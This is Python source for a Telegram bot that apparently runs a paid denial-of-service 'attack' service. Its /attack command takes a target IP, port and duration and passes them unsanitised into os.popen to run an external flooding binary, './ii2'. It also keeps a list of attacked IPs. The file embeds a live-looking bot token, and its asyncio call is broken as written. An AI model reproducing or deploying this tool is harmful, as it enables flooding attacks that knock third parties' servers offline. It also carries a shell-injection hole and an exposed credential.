import os
import asyncio
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
from telegram.error import TelegramError

TELEGRAM_BOT_TOKEN = '7636730003:AAFRKwkdag_9JwLRkwS7vhddut91jqIcJtM'
ALLOWED_USER_ID = 6073143283 
bot_access_free = True  

# Store attacked IPs to prevent duplicate attacks
attacked_ips = set()

def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

def run_attack(chat_id, ip, port, duration, context):
    try:
        process = os.popen(f"./ii2 {ip} {port} {duration} 400 600")
        output = process.read()
        process.close()

        if output:
            print(f"[stdout]\n{output}")

    except Exception as e:
        context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  

    if user_id != ALLOWED_USER_ID:
        context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    if ip in attacked_ips:
        context.bot.send_message(chat_id=chat_id, text=f"*⚠️ This IP ({ip}) has already been attacked!*\n*Try another target.*", parse_mode='Markdown')
        return

    attacked_ips.add(ip)  # Store attacked IP

    context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    updater = Updater(token=TELEGRAM_BOT_TOKEN, use_context=True)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("attack", attack))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
